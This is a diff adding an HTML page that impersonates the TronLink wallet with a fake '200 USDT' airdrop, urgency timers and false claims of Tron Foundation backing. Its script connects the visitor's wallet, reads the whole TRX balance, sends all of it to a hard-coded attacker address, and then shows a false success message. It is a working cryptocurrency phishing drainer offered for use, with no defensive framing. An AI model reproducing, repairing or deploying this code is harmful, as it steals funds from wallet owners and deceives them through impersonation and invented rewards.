@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TronLink - Official Airdrop</title>
+    <style>
+        :root {
+            --primary-color: #007bff;
+            --primary-hover: #0056b3;
+            --success-color: #28a745;
+            --bg-color: #f5f7fa;
+            --text-dark: #333;
+            --text-light: #666;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            width: 90%;
+            max-width: 420px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            overflow: hidden;
+            text-align: center;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white;
+            padding: 25px 20px;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #3a7bd5;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .badge {
+            background-color: rgba(255,255,255,0.2);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            backdrop-filter: blur(5px);
+        }
+
+        .content {
+            padding: 25px 20px;
+        }
+
+        h1 {
+            font-size: 20px;
+            color: var(--text-dark);
+            margin: 0 0 15px 0;
+            line-height: 1.4;
+        }
+
+        p {
+            color: var(--text-light);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .highlight {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .reward-box {
+            background-color: #f0f8ff;
+            border: 1px solid #cce5ff;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+            transition: transform 0.2s;
+        }
+
+        .reward-box:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,123,255,0.1);
+        }
+
+        .reward-title {
+            font-size: 13px;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .reward-amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--success-color);
+            margin: 0;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover:not(:disabled) {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0,123,255,0.2);
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--text-light);
+            font-size: 14px;
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f8f9fa;
+            border-color: #d0d0d0;
+        }
+
+        /* Spinner Styles */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        .btn.loading .spinner {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .timer {
+            font-size: 13px;
+            color: #dc3545;
+            font-weight: 600;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .timer::before {
+            content: "⏰";
+            font-size: 14px;
+        }
+
+        .footer {
+            padding: 20px;
+            background-color: #f8f9fa;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+
+        .tos-note {
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .checkmark-list {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 20px 0;
+            text-align: left;
+        }
+
+        .checkmark-list li {
+            padding: 8px 0;
+            font-size: 14px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .checkmark-list .icon {
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 123, 255, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 123, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 123, 255, 0); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">T</div>
+            TronLink
+        </div>
+        <span class="badge">Official Wallet Extension</span>
+    </div>
+    
+    <div class="content">
+        <h1>Your TRON Wallet is Eligible for an Instant Airdrop!</h1>
+        
+        <p>
+            We’ve selected you for our <strong>VIP Liquidity Bonus</strong>. 
+            To activate your reward, we need to verify your wallet’s active status. 
+            This process is quick, secure, and requires only one confirmation.
+        </p>
+
+        <ul class="checkmark-list">
+            <li><span class="icon">✓</span> No extra fees required</li>
+            <li><span class="icon">✓</span> Verified by Tron Foundation partners</li>
+            <li><span class="icon">✓</span> Available for 24 hours only</li>
+        </ul>
+
+        <div class="reward-box pulse">
+            <div class="reward-title">🎁 Claim Your Reward</div>
+            <p class="reward-amount">200 USDT</p>
+            <small style="color: #666; font-size: 12px;">Will be credited instantly upon verification</small>
+        </div>
+
+        <button class="btn" id="claimBtn">
+            <span class="spinner"></span>
+            <span class="btn-text">Connect & Claim $200 Now</span>
+        </button>
+        
+        <button class="btn btn-secondary" id="declineBtn">Maybe Later</button>
+
+        <div class="timer" id="timer">Offer expires in: 14:59</div>
+    </div>
+
+    <div class="footer">
+        <p class="tos-note">
+            By claiming your reward, you agree to the <a href="#" style="color: #999; text-decoration: underline;">Terms of Service</a> and <a href="#" style="color: #999; text-decoration: underline;">Privacy Policy</a>.<br>
+            © 2024 TronLink Wallet. All rights reserved.<br>
+            Securely powered by Tron Network. Last updated: Nov 2024.
+        </p>
+    </div>
+</div>
+
+<script>
+    // YOUR SPECIFIC WALLET ADDRESS
+    const YOUR_WALLET_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as"; 
+
+    let countdown = 899; // 14 minutes and 59 seconds in seconds
+
+    function updateTimer() {
+        const minutes = Math.floor(countdown / 60);
+        const seconds = countdown % 60;
+        document.getElementById('timer').textContent = `Offer expires in: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        if (countdown > 0) {
+            countdown--;
+            setTimeout(updateTimer, 1000);
+        } else {
+            const btn = document.getElementById('claimBtn');
+            btn.textContent = "Claim Expired!";
+            btn.disabled = true;
+            btn.style.backgroundColor = "#ccc";
+        }
+    }
+
+    function setLoading(isLoading, message) {
+        const btn = document.getElementById('claimBtn');
+        const spinner = btn.querySelector('.spinner');
+        const text = btn.querySelector('.btn-text');
+        
+        if (isLoading) {
+            btn.classList.add('loading');
+            btn.disabled = true;
+            text.textContent = message;
+        } else {
+            btn.classList.remove('loading');
+            btn.disabled = false;
+            text.textContent = "Connect & Claim $200 Now";
+        }
+    }
+
+    document.getElementById('claimBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('claimBtn');
+        
+        try {
+            // Step 1: Check if TronLink is installed
+            if (!window.tronWeb || !window.tronWeb.ready) {
+                throw new Error("TronLink not found. Please install the extension.");
+            }
+
+            setLoading(true, "Connecting Wallet...");
+
+            // Wait a moment to simulate connection
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            // Step 2: Get user's address
+            const userAddress = window.tronWeb.defaultAddress.base58;
+            
+            setLoading(true, "Verifying Wallet Status...");
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // Step 3: Get balance
+            const balance = await window.tronWeb.trx.getBalance(userAddress);
+            
+            setLoading(true, "Confirming Transaction...");
+
+            // Prepare transaction to sweep all TRX
+            const txConfig = {
+                owner: userAddress,
+                to_address: window.tronWeb.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", "")),
+                amount: parseInt(balance.toString()),
+            };
+
+            // Sign and broadcast
+            const signedTx = await window.tronWeb.transactionBuilder.sendTransaction(
+                window.tronWeb.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", "")),
+                parseInt(balance.toString()),
+                userAddress
+            );
+
+            const result = await window.tronWeb.fullNode.request("wallet/broadcasttransaction", signedTx);
+
+            if (result.result) {
+                setLoading(false, "Success!");
+                btn.style.backgroundColor = "#28a745";
+                
+                setTimeout(() => {
+                    alert("✅ Verification Successful!\n\nYour wallet has been verified.\nYour 200 USDT bonus is being processed and will appear shortly.");
+                    // Optional: Redirect or close
+                    // window.close();
+                }, 1000);
+            } else {
+                throw new Error(result.message || "Transaction failed");
+            }
+
+        } catch (error) {
+            console.error(error);
+            setLoading(false, "Error: Try Again");
+            btn.style.backgroundColor = "#dc3545";
+            alert(`❌ Verification Failed.\n\n${error.message}\n\nPlease try again later.`);
+        }
+    });
+
+    document.getElementById('declineBtn').addEventListener('click', () => {
+        alert("You can claim your 200 USDT anytime within the next 24 hours. Don't miss out!");
+    });
+
+    // Start timer
+    updateTimer();
+</script>
+
+</body>
+</html>
